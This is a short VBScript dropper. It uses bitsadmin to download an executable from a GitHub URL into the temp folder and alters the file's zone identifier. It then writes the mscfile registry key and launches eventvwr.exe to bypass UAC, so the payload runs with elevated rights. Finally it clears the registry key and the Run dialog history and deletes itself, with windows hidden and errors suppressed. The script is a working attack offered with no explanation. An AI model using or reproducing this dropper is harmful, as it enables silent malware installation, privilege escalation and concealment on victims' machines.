Sub Main()
	'Download File
	CreateObject("WScript.Shell").run("cmd /c bitsadmin /transfer SoftUpdate /download /priority FOREGROUND https://github.com/tanc7/arms-commander/blob/master/svchost_alpha_upper_staged.exe %temp%/update.exe"),0,true
	'Set new zoneId
	CreateObject("WScript.Shell").run("cmd.exe /C echo [zoneTransfer]ZoneID = 2 > " + CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) + "\update.exe:ZONE.identifier"),0,true
	'Write UAC bypass regkey
	CreateObject("WScript.Shell").RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) +"\update.exe" ,"REG_SZ"
	'Trigger UAC bypass
	CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
	'Reset regkey 
	GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv").DeleteValue &H80000001,"Software\Classes\mscfile\shell\open\command\",""
	'Clear the run-dialog history
	CreateObject("WScript.Shell").Run("cmd.exe /C reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f "),0,true
	'Remove this script
	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False
End Sub 
'Dont wanna display shit
On Error Resume Next

  Main


  If Err.Number Then

     'on error cleanup and exit

	CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False

     WScript.Quit 4711

End If